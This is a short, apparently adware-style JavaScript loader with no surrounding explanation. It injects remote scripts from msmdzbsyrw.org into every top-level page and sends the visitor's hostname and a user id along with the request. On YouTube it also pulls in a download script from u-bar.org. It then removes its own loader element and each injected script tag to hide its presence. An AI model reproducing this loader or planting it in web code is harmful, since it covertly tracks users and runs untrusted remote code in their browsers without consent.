void function(){if(window.self!==window.top)return;var pid='ins1634',uid='10c23e9c-a0a9-43fa-97c4-b7969c87148f',osid='8164',ts=1479581035105,h=0,aff=0,appid='ins1634-8164-1479581035105-10c23e9c-a0a9-43fa-97c4-b7969c87148f';var extadActive = 1;//(Date.now() - ts > 7200000) ? 1 : 0;
inject('//msmdzbsyrw.org/app/noext/main.php?pid=' + pid + '&eid=2&uid=' + uid + '&host=' + location.hostname + '&active=' + extadActive + '&extad_init=' + (window.EXTADinit ? 1 : 0)+'&h='+h+'&ts='+ts+'&aff='+aff+'&appid='+appid);
location.hostname === 'www.youtube.com' && inject('https://www.u-bar.org/js/download.js');
removeSelf();
function removeSelf() {
  var scr=document.getElementById('ubar-loader')||document.getElementById('videoplugin-loader');
  scr&&tryToRemove(scr);
}
function inject(src){
  var scr=document.createElement('script');
  scr.src=src;
  scr.onload=scr.onerror=function(){setTimeout(function(){tryToRemove(scr)},0)};
  document.body.appendChild(scr);
}
function tryToRemove(node){try{node.parentNode.removeChild(node)}catch(ex){}}
}();
